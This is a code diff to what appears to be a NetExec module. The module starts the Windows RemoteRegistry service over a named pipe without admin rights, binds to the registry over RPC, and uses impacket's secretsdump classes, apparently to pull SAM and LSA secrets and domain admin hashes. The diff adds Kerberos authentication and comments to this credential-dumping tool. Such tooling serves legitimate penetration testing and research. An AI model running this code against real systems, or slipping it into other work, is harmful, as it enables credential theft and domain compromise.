@@ -6,6 +6,7 @@ import sys
 from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
 from impacket.smbconnection import SessionError
 from impacket.dcerpc.v5 import transport, rrp
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket import nt_errors
 
 from nxc.paths import NXC_PATH
@@ -24,16 +25,20 @@ class NXCModule:
         self.domain_admin_hash = None
 
     def options(self, context, module_options):
-        """OPTIONS"""
+        """NO OPTIONS"""
 
     def on_login(self, context, connection):
         connection.args.share = "SYSVOL"
         # enable remote registry
-        context.log.display("Triggering start through named pipe...")
+        context.log.display("Triggering RemoteRegistry to start through named pipe...")
         self.trigger_winreg(connection.conn, context)
         rpc = transport.DCERPCTransportFactory(r"ncacn_np:445[\pipe\winreg]")
         rpc.set_smb_connection(connection.conn)
+        if connection.kerberos:
+            rpc.set_kerberos(connection.kerberos, kdcHost=connection.kdcHost)
         dce = rpc.get_dce_rpc()
+        if connection.kerberos:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
         dce.connect()
         dce.bind(rrp.MSRPC_UUID_RRP)
 
@@ -113,6 +118,7 @@ class NXCModule:
 
     def trigger_winreg(self, connection, context):
         # Original idea from https://twitter.com/splinter_code/status/1715876413474025704
+        # Basically triggers the RemoteRegistry to start without admin privs
         tid = connection.connectTree("IPC$")
         try:
             connection.openFile(
